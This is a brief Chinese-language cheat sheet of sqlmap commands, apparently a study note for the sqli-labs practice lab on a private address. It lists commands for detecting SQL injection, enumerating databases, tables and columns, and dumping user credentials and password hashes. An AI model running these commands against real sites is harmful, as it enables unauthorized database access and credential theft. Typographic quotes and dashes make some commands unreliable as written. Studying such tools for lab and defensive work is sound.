sqlmap语法

  1. 判断是否存在注入
    sqlmap.py -u “目标URL”
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1"

  2. 从一个包含有WEB数据包的txt文件中加载HTTP请求，SQLMAP可以从一个文本文件中获取HTTP请求，这样就可以不设置其它参数（如cookie,POST数据等）
    sqlmap.py -r 文件路径 (-r参数一般在存在cookie注入时使用)
    sqlmap.py -r H:\下载\sqli.txt

  3. 查询当前用户下的所有数据库
    sqlmap.py -u “目标URL” –dbs
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" –dbs

  4. 获取某一数据库中所有的表名
    sqlmap.py -u “目标URL” -D 数据库名 –tables
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security –tables

  5. 获取某一数据库中某一表下的所有字段名
    sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –columns
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security -T users –columns

  6. 获取某一数据库中某一表下的某些字段内容
    sqlmap.py -u “目标URL” -D 数据库名 -T 表名 -C 字段名,字段名 –dump
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security -T users -C username,password –dump

  7. 获取某一数据库中某一表下的所有字段内容
    sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –dump
    sqlmap.py -u “http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1" -D security -T users –dump

  8. 获取数据库的所有用户（在当前用户有权限读取包含所有用户表的权限时）
    sqlmap.py -u “目标URL” –users

  9. 获取数据库用户的密码
    sqlmap.py -u “目标URL” –passwords

  10. 获取当前网站数据库的名称
    sqlmap.py -u “目标URL” –current-db

  11. 获取当前网站的数据库的用户名称
    sqlmap.py -u “目标URL” –current-user
